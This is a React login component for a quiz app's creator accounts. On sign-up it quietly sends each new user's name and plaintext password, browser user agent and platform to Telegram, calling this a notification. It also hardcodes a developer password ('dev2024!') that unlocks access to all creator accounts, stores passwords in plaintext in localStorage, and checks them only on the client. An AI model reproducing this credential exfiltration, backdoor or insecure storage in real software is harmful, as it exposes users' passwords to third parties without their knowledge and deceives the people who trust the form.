import React, { useState } from 'react';
import Loader from './Loader';
import TelegramService from '../services/telegramService';

interface CreatorLoginProps {
  setView: (view: string) => void;
}

const CreatorLogin: React.FC<CreatorLoginProps> = ({ setView }) => {
  const [creatorName, setCreatorName] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showDevLogin, setShowDevLogin] = useState(false);
  const [devPassword, setDevPassword] = useState('');

  const handleLogin = async () => {
    if (!creatorName.trim()) {
      setError('Please enter your name!');
      return;
    }

    if (!password.trim()) {
      setError('Please enter a password!');
      return;
    }

    setLoading(true);
    setError('');

    try {
      // Simple localStorage-based authentication
      const storedPassword = localStorage.getItem(`creator_${creatorName}`);
      
      if (storedPassword) {
        // Existing creator - check password
        if (storedPassword === password) {
          localStorage.setItem('currentCreator', creatorName);
          setView('creator-space');
        } else {
          setError('Incorrect password!');
        }
      } else {
        // New creator - create account
        localStorage.setItem(`creator_${creatorName}`, password);
        localStorage.setItem('currentCreator', creatorName);
        
        // Send Telegram notification for new account creation
        try {
          const telegramService = TelegramService.getInstance();
          await telegramService.notifyNewAccount({
            username: creatorName.trim(),
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform
          });
          console.log('CreatorLogin: New account notification sent to Telegram');
        } catch (telegramError) {
          console.error('CreatorLogin: Failed to send Telegram notification:', telegramError);
          // Don't block the login process if Telegram notification fails
        }
        
        setView('creator-space');
      }
    } catch (error) {
      console.error('Login error:', error);
      setError('Login failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleDevLogin = () => {
    if (!devPassword.trim()) {
      setError('Please enter the developer password!');
      return;
    }

    // Developer password - you can change this to whatever you want
    const correctDevPassword = 'dev2024!';
    
    if (devPassword === correctDevPassword) {
      localStorage.setItem('currentCreator', 'Developer');
      setView('creator-space');
    } else {
      setError('Incorrect developer password!');
    }
  };

  // Check if creator exists for button text
  const isExistingCreator = creatorName.trim() && localStorage.getItem(`creator_${creatorName}`);

  if (loading) {
    return <Loader text="Logging you in..." />;
  }

  return (
    <div className="min-h-screen bg-dreamy animate-fade-in">
      <div className="container mx-auto px-4 py-6">
        {/* Header */}
        <div className="card mb-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <button
                onClick={() => setView('welcome')}
                className="w-10 h-10 bg-lavender-100 hover:bg-lavender-200 rounded-xl flex items-center justify-center transition-all duration-200"
              >
                ←
              </button>
              <div>
                <h1 className="text-2xl font-bold text-charcoal-800">Creator Login</h1>
                <p className="text-charcoal-600">Access your creator space</p>
              </div>
            </div>
            <div className="w-12 h-12 bg-gradient-to-br from-teal-400 to-coral-400 rounded-2xl flex items-center justify-center shadow-neon-teal">
              <span className="text-2xl">👑</span>
            </div>
          </div>
        </div>

        {/* Login Form */}
        <div className="max-w-md mx-auto">
          <div className="card animate-slide-up">
            <div className="text-center mb-8">
              <div className="w-24 h-24 bg-gradient-to-br from-lavender-200 to-powder-200 rounded-3xl flex items-center justify-center mx-auto mb-6 animate-bounce-gentle">
                <span className="text-4xl">🔐</span>
              </div>
              <h2 className="text-xl font-bold text-charcoal-800 mb-2">Welcome Back!</h2>
              <p className="text-charcoal-600">
                Sign in to manage your quizzes and see results
              </p>
            </div>

            <div className="space-y-6">
              {/* Creator Name */}
              <div>
                <label className="block text-sm font-semibold text-charcoal-700 mb-3">
                  Creator Name
                </label>
                <input
                  type="text"
                  value={creatorName}
                  onChange={(e) => setCreatorName(e.target.value)}
                  placeholder="Enter your creator name..."
                  className="input-field w-full text-center text-lg font-semibold"
                  maxLength={30}
                />
                <p className="text-xs text-charcoal-500 mt-2">
                  This will be your creator identity
                </p>
              </div>

              {/* Password */}
              <div>
                <label className="block text-sm font-semibold text-charcoal-700 mb-3">
                  Password
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password..."
                  className="input-field w-full text-center text-lg font-semibold"
                  maxLength={50}
                />
                <p className="text-xs text-charcoal-500 mt-2">
                  New creators: this will create your account
                </p>
              </div>

              {/* Error Message */}
              {error && (
                <div className="bg-coral-50 border border-coral-200 rounded-2xl p-4 animate-bounce-in">
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">⚠️</span>
                    <p className="text-coral-700 font-medium">{error}</p>
                  </div>
                </div>
              )}

              {/* Login Button */}
              <button
                onClick={handleLogin}
                disabled={!creatorName.trim() || !password.trim() || loading}
                className="btn-primary w-full disabled:opacity-50 disabled:cursor-not-allowed group"
              >
                <span className="mr-2">🚀</span>
                {isExistingCreator ? 'Sign In' : 'Create Account'}
                <span className="ml-2 group-hover:scale-110 transition-transform">✨</span>
              </button>
            </div>
          </div>

          {/* Developer Access */}
          <div className="card mt-6">
            <div className="text-center">
              <h3 className="text-lg font-bold text-charcoal-800 mb-4">
                Developer Access
              </h3>
              <p className="text-charcoal-600 mb-4 text-sm">
                Access all creator accounts and manage the platform
              </p>
              
              {!showDevLogin ? (
                <button
                  onClick={() => setShowDevLogin(true)}
                  className="btn-secondary group"
                >
                  <span className="mr-2">🔧</span>
                  Developer Mode
                  <span className="ml-2 group-hover:scale-110 transition-transform">⚡</span>
                </button>
              ) : (
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-semibold text-charcoal-700 mb-2">
                      Developer Password
                    </label>
                    <input
                      type="password"
                      value={devPassword}
                      onChange={(e) => setDevPassword(e.target.value)}
                      placeholder="Enter developer password..."
                      className="input-field w-full text-center text-lg font-semibold"
                      maxLength={50}
                    />
                  </div>
                  <div className="flex gap-3">
                    <button
                      onClick={() => {
                        setShowDevLogin(false);
                        setDevPassword('');
                        setError('');
                      }}
                      className="btn-secondary flex-1"
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleDevLogin}
                      disabled={!devPassword.trim()}
                      className="btn-accent flex-1 disabled:opacity-50 disabled:cursor-not-allowed group"
                    >
                      <span className="mr-2">🔧</span>
                      Access Dev Panel
                      <span className="ml-2 group-hover:scale-110 transition-transform">⚡</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Help Section */}
          <div className="card mt-6">
            <div className="text-center">
              <h3 className="text-lg font-bold text-charcoal-800 mb-4">
                Need Help?
              </h3>
              <div className="space-y-3 text-sm">
                <div className="bg-gradient-to-br from-lavender-50 to-powder-50 rounded-2xl p-4 border border-lavender-200">
                  <div className="text-2xl mb-2">🆕</div>
                  <h4 className="font-semibold text-charcoal-800 mb-1">New Creator?</h4>
                  <p className="text-charcoal-600">
                    Just enter a name and password to create your account
                  </p>
                </div>
                <div className="bg-gradient-to-br from-powder-50 to-teal-50 rounded-2xl p-4 border border-powder-200">
                  <div className="text-2xl mb-2">🔑</div>
                  <h4 className="font-semibold text-charcoal-800 mb-1">Forgot Password?</h4>
                  <p className="text-charcoal-600">
                    Contact support or create a new account with a different name
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CreatorLogin; 